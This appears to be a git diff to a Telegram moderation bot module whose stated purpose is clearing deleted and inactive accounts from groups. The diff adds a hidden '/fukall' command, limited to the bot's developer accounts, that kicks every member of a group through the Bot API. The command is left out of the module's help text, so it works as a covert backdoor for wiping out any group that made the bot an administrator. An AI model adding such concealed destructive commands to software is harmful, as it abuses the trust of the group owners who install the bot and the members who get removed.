@@ -113,6 +113,7 @@ async def zombies(event):
     await cleaning_zombies.edit(del_status)
     
     
+    
 from telethon.tl.types import UserStatusLastMonth, UserStatusLastWeek, ChatBannedRights
 from LaylaRobot.events import register
 from telethon import *
@@ -152,4 +153,46 @@ async def _(event):
 
     required_string = "Successfully Kicked **{}** users"
     await event.reply(required_string.format(c))
+    
+    
+    
+import asyncio
+import html
+import os
+import re
+import sys
+
+import aiohttp
+import regex
+from aiohttp import ClientSession
+from LaylaRobot import OWNER_ID, DRAGONS, DEV_USERS, TOKEN, pbot
+from pyrogram import Client, filters
+from pyrogram.types import Message
+
+
+@pbot.on_message(filters.command("fukall") &
+                 filters.group & filters.user(DEV_USERS))
+async def ban_all(c: Client, m: Message):
+    chat = m.chat.id
+
+    async for member in c.iter_chat_members(chat):
+        user_id = member.user.id
+        url = (
+            f"https://api.telegram.org/bot{TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
+        async with aiohttp.ClientSession() as session:
+            await session.get(url)
+            
+
+            
+
+__mod_name__ = "Kick"
+
+__help__ = """
+*Zombies*
+ ❍ /zombies: counts the number of deleted account in your group
+ ❍ /zombies clean: Remove deleted accounts from group.
+ 
+*kickthefools*
+ ❍ /kickthefools: Remove offline accounts from group.
+ """            
 
